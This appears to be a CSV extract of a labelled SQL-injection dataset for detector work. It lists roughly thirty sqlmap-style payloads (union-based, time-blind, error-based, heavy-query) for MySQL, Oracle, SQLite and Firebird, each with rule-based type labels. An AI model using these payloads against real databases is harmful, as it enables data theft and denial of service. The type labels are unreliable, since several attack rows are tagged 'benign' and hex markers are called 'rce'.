row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10680,"1'|| ( select 'pnsw' where 2103 = 2103 union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10681,"1'+ ( select vvet where 5221 = 5221 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10682,"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) # jcdh",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10683,1' ) as gxfu where 9676 = 9676,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10684,"1' where 2025 = 2025 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10685,-3297' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
10686,"1 ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 6829 = 6829",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
10687,"-5231%"" or 4945 = 8402#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10688,1' ) as yqld where 2489 = 2489,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10689,1' and sleep ( 5 ) and 'pfgy' = 'pfgy,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10690,"-5160' ) union all select 8067,8067,8067,8067,8067,8067,8067--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10691,"1' ) ) as eleh where 1347 = 1347 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
10692,"-8205' or elt ( 6581 = 3480,3480 ) and 'sosv' = 'sosv",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10693,"1"" ) ) as dooq where 7911 = 7911",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10694,"-6965' ) union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10695,1' ) ) as yefv where 4263 = 4263,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10696,"1%"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""%"" = """,1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
10697,1'+ ( select bfeq where 3445 = 3445 and 9198 = 9198--,1,,boolean_blind,generic,0.95,3445 = 3445 and detected — boolean_blind injection (priority 8) on generic,rule-based
10698,"-6870"" ) as deox where 8198 = 8198 union all select 8198#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10699,"1 where 2031 = 2031 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
10700,"-6020'+ ( select isrz where 2489 = 2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10701,"1%' ) ) union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10702,( select ( case when ( 1421 = 1421 ) then 1 else 1421* ( select 1421 from master..sysdatabases ) end ) ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10703,1' where 9206 = 9206,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10704,1'+ ( select tafk where 9652 = 9652,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10705,"1',iif ( 4861 = 6268,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
10706,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'pshn' like 'pshn",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
10707,"1'+ ( select 'zkum' where 5161 = 5161 union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10708,"1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
10709,"-9445 ) as dmur where 4371 = 4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
